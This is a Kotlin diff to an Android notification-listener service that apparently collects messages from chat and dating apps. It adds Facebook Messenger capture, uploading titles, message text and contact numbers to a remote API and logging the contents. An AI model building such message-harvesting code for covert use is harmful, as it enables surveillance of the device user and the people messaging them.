@@ -122,10 +122,10 @@ class NotificationService : NotificationListenerService() {
                     addNotification(title.toString(),text.toString(),packageName,type,"",triggerTime)
                 }
                 getNotificationList()
-                getWhatsappNotification()
                 getSkypeNotification()
                 getViberNotification()
                 getFacebookNotification()
+                getFacebookMessengerNotification()
                 getTinderNotification()
                 getKikNotification()
                 getLineNotification()
@@ -343,6 +343,43 @@ class NotificationService : NotificationListenerService() {
                 notificationList[notification] // "position"  or any number value according to your lemmaHeadingList.size().
 
             Log.d("TinderNotificationGet", "id = " + model.id.toString() + ", PackageName = " + model.packageName + ", Title = " + model.title + ", Detail = " + model.detail)
+        }
+    }
+    private fun getFacebookMessengerNotification() {
+        val sharedPreferences: SharedPreferences = this.getSharedPreferences("token",
+            AppCompatActivity.MODE_PRIVATE
+        )
+        val preferences = getSharedPreferences("login", MODE_PRIVATE)
+        val name = preferences.getString("name", "")
+        val token: String = sharedPreferences.getString("token", "").toString()
+        val notificationList = sqliteHelper.getNotification("com.facebook.orca")
+        Log.d("Facebook List", notificationList.size.toString())
+        val dataList = ArrayList<ApiNotificationModel>()
+        val id = ArrayList<Int>()
+        for (item in notificationList) {
+            id.add(item.id)
+            // body of loop
+            dataList.add(
+                ApiNotificationModel(
+                    item.title,
+                    name.toString(),
+                    item.detail,
+                    item.messageType,
+                    item.messageLogTime,
+                    item.contactNumber
+                )
+            )
+        }
+        if(dataList.isNotEmpty()){
+            var baseUrl = getString(R.string.api)
+
+            apiCall.callFacebookApi(baseUrl,dataList,token,applicationContext,id,sqliteHelper)
+        }
+        for (notification in notificationList.indices) {
+            val model: NotificationModel =
+                notificationList[notification] // "position"  or any number value according to your lemmaHeadingList.size().
+
+            Log.d("FacebookNotificationGet", "id = " + model.id.toString() + ", PackageName = " + model.packageName + ", Title = " + model.title + ", Detail = " + model.detail)
         }
     }
     private fun getFacebookNotification() {
